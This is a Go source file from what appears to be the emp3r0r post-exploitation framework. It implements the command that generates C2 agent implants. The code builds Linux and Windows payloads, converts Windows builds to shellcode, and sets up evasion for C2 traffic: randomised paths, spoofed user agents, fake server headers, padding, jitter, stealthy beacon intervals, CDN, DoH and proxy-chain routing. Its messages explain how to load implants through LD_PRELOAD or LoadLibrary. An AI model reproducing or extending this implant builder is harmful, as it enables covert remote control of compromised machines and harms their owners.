package operator

import (
	"fmt"
	"net/url"
	"os"
	"slices"
	"strings"
	"time"

	"github.com/google/uuid"
	"github.com/jm33-m0/emp3r0r/core/internal/cc/api/client"
	"github.com/jm33-m0/emp3r0r/core/internal/cc/config"
	"github.com/jm33-m0/emp3r0r/core/internal/cc/controllers"
	"github.com/jm33-m0/emp3r0r/core/internal/live"
	"github.com/jm33-m0/emp3r0r/core/internal/transport"
	"github.com/jm33-m0/emp3r0r/core/lib/donut"
	"github.com/jm33-m0/emp3r0r/core/lib/logging"
	"github.com/jm33-m0/emp3r0r/core/lib/util"
	"github.com/spf13/cobra"
)

const (
	PayloadTypeLinuxExecutable   = "linux_executable"
	PayloadTypeWindowsExecutable = "windows_executable"
	PayloadTypeWindowsDLL        = "windows_dll"
	PayloadTypeLinuxSO           = "linux_so"
)

var PayloadTypeList = []string{
	PayloadTypeLinuxExecutable,
	PayloadTypeLinuxSO,
	PayloadTypeWindowsExecutable,
	PayloadTypeWindowsDLL,
}

var Arch_List_Windows = []string{
	"386",
	"amd64",
	"arm64",
}

var Arch_List_Windows_DLL = []string{
	"386",
	"amd64",
	"arm64",
}

var Arch_List_Linux_SO = []string{
	"amd64",
	"386",
	"arm",
	"riscv64",
}

var Arch_List_All = []string{
	"386",
	"amd64",
	"arm",
	"arm64",
	"mips",
	"mips64",
	"riscv64",
}

// CmdGenerateAgent generates agent binary
func CmdGenerateAgent(cmd *cobra.Command, args []string) {
	// Parse flags (UI layer)
	payloadType, _ := cmd.Flags().GetString("type")
	archChoice, _ := cmd.Flags().GetString("arch")

	if !isArchValid(payloadType, archChoice) {
		logging.Errorf("Invalid arch choice")
		return
	}

	// Fill config (UI layer - handles flag parsing and user interaction)
	if err := MakeConfig(cmd); err != nil {
		logging.Errorf("Failed to configure agent: %v", err)
		return
	}

	// Build agent (business logic via controller)
	// 1. Generate UUID
	agentUUID := uuid.NewString()

	// 2. Sign UUID with server
	sig, err := client.SignAgent(agentUUID)
	if err != nil {
		logging.Errorf("Failed to sign agent UUID: %v", err)
		return
	}

	buildCfg := controllers.AgentBuildConfig{
		PayloadType:  payloadType,
		Arch:         archChoice,
		Timestamp:    time.Now(),
		WorkSpace:    live.EmpWorkSpace,
		AgentUUID:    agentUUID,
		AgentUUIDSig: sig,
	}

	result, err := controllers.BuildAgent(buildCfg, live.RuntimeConfig)
	if err != nil {
		logging.Errorf("Failed to build agent: %v", err)
		return
	}

	// Success (UI layer)
	logging.Infof("Generated agent UUID: %s", result.AgentUUID)
	logging.Debugf("Config payload: %d bytes", result.ConfigSize)
	logging.Successf("Generated %s from %s and %s", result.OutputFile, result.StubFile, live.EmpConfigFile)

	// Generate shellcode for Windows (UI layer)
	if payloadType == PayloadTypeWindowsExecutable || payloadType == PayloadTypeWindowsDLL {
		donut.DonoutPE2Shellcode(result.OutputFile, archChoice)
	}

	// Informational messages (UI layer)
	if payloadType == PayloadTypeLinuxExecutable {
		logging.Printf("Use stager module to create a shared library stager that delivers the agent with encryption and compression. You will need another stager to load the shared library (or use LD_PRELOAD)")
	}
	if payloadType == PayloadTypeLinuxSO {
		logging.Printf("Note: linux_so supports CGO and can be loaded as a shared library using LD_PRELOAD or dlopen()")
	}
	if payloadType == PayloadTypeWindowsDLL {
		logging.Printf("Note: windows_dll supports CGO and can be loaded as a DLL using LoadLibrary() or similar methods")
	}
}

func isArchValid(payload_type, arch_choice string) bool {
	var list []string
	switch payload_type {
	case PayloadTypeWindowsExecutable:
		list = Arch_List_Windows
	case PayloadTypeWindowsDLL:
		list = Arch_List_Windows_DLL
	case PayloadTypeLinuxSO:
		list = Arch_List_Linux_SO
	default:
		list = Arch_List_All
	}
	return slices.Contains(list, arch_choice)
}

func MakeConfig(cmd *cobra.Command) (err error) {
	cc_host, _ := cmd.Flags().GetString("cc")
	cdn_proxy, _ := cmd.Flags().GetString("cdn")
	c2transport_proxy, _ := cmd.Flags().GetString("proxy")
	doh_server, _ := cmd.Flags().GetString("doh")
	proxy_chain, _ := cmd.Flags().GetBool("proxychain")
	proxy_chain_min, _ := cmd.Flags().GetInt("proxychain-wait-min")
	proxy_chain_max, _ := cmd.Flags().GetInt("proxychain-wait-max")
	ncsi, _ := cmd.Flags().GetBool("ncsi")
	kcp, _ := cmd.Flags().GetBool("kcp")
	is_stager, _ := cmd.Flags().GetBool("stager")

	// Preflight check is now enabled by default for better stealth
	live.RuntimeConfig.PreflightEnabled = true

	// read existing config when possible
	if util.IsExist(live.EmpConfigFile) {
		logging.Infof("Reading config from existing %s", live.EmpConfigFile)
		jsonData, err := os.ReadFile(live.EmpConfigFile)
		if err != nil {
			return fmt.Errorf("failed to read %s: %v", live.EmpConfigFile, err)
		}
		// load to live.RuntimeConfig
		err = config.ReadJSONConfig(jsonData, live.RuntimeConfig)
		if err != nil {
			return fmt.Errorf("parsing existing %s: %v", live.EmpConfigFile, err)
		}
	}

	// CC names and certs
	if cmd.Flags().Changed("cc") || cc_host != "" {
		live.RuntimeConfig.CCAddress = cc_host
	}
	live.RuntimeConfig.CCAddress = strings.TrimSuffix(live.RuntimeConfig.CCAddress, "/")
	logging.Printf("C2 server name: %s", live.RuntimeConfig.CCAddress)
	existing_names := transport.NamesInCert(transport.ServerCrtFile)

	exists := slices.Contains(existing_names, live.RuntimeConfig.CCAddress)
	if !exists && live.RuntimeConfig.CCAddress != "" {
		logging.Warningf("Name '%s' is not covered by our server cert, fetching new certs from server",
			live.RuntimeConfig.CCAddress)

		certs, err := client.GetCerts()
		if err != nil {
			return fmt.Errorf("failed to get certs from server: %v", err)
		}

		// Save certs
		if err := os.WriteFile(transport.CaCrtFile, certs["ca_crt"], 0644); err != nil {
			return fmt.Errorf("failed to save CA cert: %v", err)
		}
		if err := os.WriteFile(transport.ServerCrtFile, certs["server_crt"], 0644); err != nil {
			return fmt.Errorf("failed to save Server cert: %v", err)
		}
	}

	// Internet check
	if cmd.Flags().Changed("ncsi") {
		live.RuntimeConfig.EnableNCSI = ncsi
	}
	if live.RuntimeConfig.EnableNCSI {
		logging.Printf("NCSI is enabled")
	}

	// CDN proxy
	if cmd.Flags().Changed("cdn") || cdn_proxy != "" {
		live.RuntimeConfig.CDNProxy = cdn_proxy
	}
	if live.RuntimeConfig.CDNProxy != "" {
		logging.Printf("Using CDN proxy %s", live.RuntimeConfig.CDNProxy)
	}

	if cmd.Flags().Changed("kcp") {
		live.RuntimeConfig.UseKCP = kcp
	}
	if live.RuntimeConfig.UseKCP {
		logging.Printf("Using KCP")
	}

	// agent proxy for c2 transport
	if cmd.Flags().Changed("proxy") || c2transport_proxy != "" {
		live.RuntimeConfig.C2TransportProxy = c2transport_proxy
	}
	if live.RuntimeConfig.C2TransportProxy != "" {
		logging.Printf("Using C2 transport proxy %s", live.RuntimeConfig.C2TransportProxy)
	}

	if cmd.Flags().Changed("doh") || doh_server != "" {
		live.RuntimeConfig.DoHServer = doh_server
	}
	if live.RuntimeConfig.DoHServer != "" {
		logging.Printf("Using DoH server %s", live.RuntimeConfig.DoHServer)
	}

	// malleable C2
	if live.RuntimeConfig.C2Prefix == "" {
		live.RuntimeConfig.C2Prefix = util.RandStr(util.RandInt(3, 10))
	}
	if live.RuntimeConfig.CheckInPath == "" {
		live.RuntimeConfig.CheckInPath = util.RandStr(util.RandInt(5, 15))
	}
	if live.RuntimeConfig.MsgPath == "" {
		live.RuntimeConfig.MsgPath = util.RandStr(util.RandInt(5, 15))
	}
	if live.RuntimeConfig.UserAgent == "" {
		uaList := []string{
			"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36",
			"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
			"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36",
			"Mozilla/5.0 (iPhone; CPU iPhone OS 17_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1",
		}
		live.RuntimeConfig.UserAgent = uaList[util.RandInt(0, len(uaList))]
	}
	// Randomize C2 headers if empty
	if len(live.RuntimeConfig.C2Headers) == 0 {
		live.RuntimeConfig.C2Headers = map[string]string{
			"Accept":          "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
			"Accept-Language": "en-US,en;q=0.5",
			"Cache-Control":   "no-cache",
			"Connection":      "keep-alive",
			"Pragma":          "no-cache",
			"Server":          fmt.Sprintf("Apache/%d.%d.%d", util.RandInt(2, 3), util.RandInt(3, 5), util.RandInt(10, 50)),
			"X-Powered-By":    fmt.Sprintf("PHP/%d.%d.%d", util.RandInt(5, 9), util.RandInt(0, 5), util.RandInt(0, 30)),
			"X-Request-ID":    uuid.NewString(),
		}
	}
	if live.RuntimeConfig.PaddingMin == 0 {
		live.RuntimeConfig.PaddingMin = 1024
	}
	if live.RuntimeConfig.PaddingMax == 0 {
		live.RuntimeConfig.PaddingMax = 10240
	}
	if live.RuntimeConfig.Jitter == 0 {
		live.RuntimeConfig.Jitter = 20
	}

	// Preflight / Hybrid Mode intervals
	if live.RuntimeConfig.PreflightURL == "" {
		// generate new if empty
		live.RuntimeConfig.PreflightURL = fmt.Sprintf("https://%s:%s/%s", live.RuntimeConfig.CCAddress, live.RuntimeConfig.CCPort, util.RandStr(util.RandInt(5, 10)))
	} else {
		// synchronise host and port with CCAddress
		u, err := url.Parse(live.RuntimeConfig.PreflightURL)
		if err == nil {
			u.Host = fmt.Sprintf("%s:%s", live.RuntimeConfig.CCAddress, live.RuntimeConfig.CCPort)
			u.Scheme = "https" // ensure it's https
			live.RuntimeConfig.PreflightURL = u.String()
		}
	}
	if live.RuntimeConfig.PreflightIntervalMin == 0 {
		// Default to a reasonably long beacon interval for stealth (e.g. 30s - 120s)
		live.RuntimeConfig.PreflightIntervalMin = util.RandInt(30, 120)
	}
	if live.RuntimeConfig.PreflightIntervalMax == 0 {
		// Max should be larger than min
		live.RuntimeConfig.PreflightIntervalMax = live.RuntimeConfig.PreflightIntervalMin + util.RandInt(30, 300)
	}
	logging.Printf("Conditional C2 (Hybrid Mode) beacon interval: %d - %d seconds",
		live.RuntimeConfig.PreflightIntervalMin, live.RuntimeConfig.PreflightIntervalMax)

	if cmd.Flags().Changed("proxychain") {
		if proxy_chain {
			if !cmd.Flags().Changed("proxychain-wait-min") {
				proxy_chain_min = util.RandInt(30, 120)
			}
			live.RuntimeConfig.ProxyChainBroadcastIntervalMin = proxy_chain_min

			if !cmd.Flags().Changed("proxychain-wait-max") {
				live.RuntimeConfig.ProxyChainBroadcastIntervalMax = util.RandInt(proxy_chain_min+10, proxy_chain_min+100)
			} else {
				live.RuntimeConfig.ProxyChainBroadcastIntervalMax = proxy_chain_max
			}
			logging.Printf("Proxy chain is enabled with broadcast interval %d-%d",
				live.RuntimeConfig.ProxyChainBroadcastIntervalMin,
				live.RuntimeConfig.ProxyChainBroadcastIntervalMax)
		} else {
			live.RuntimeConfig.ProxyChainBroadcastIntervalMax = 0
			logging.Printf("Proxy chain is disabled")
		}
	} else if live.RuntimeConfig.ProxyChainBroadcastIntervalMax == 0 {
		logging.Printf("Proxy chain is disabled")
	}

	if cmd.Flags().Changed("stager") {
		live.RuntimeConfig.IsRunByStager = is_stager
	}
	if live.RuntimeConfig.IsRunByStager {
		logging.Printf("Agent is built for stager")
	}

	// save emp3r0r.json
	return config.SaveConfigJSON()
}
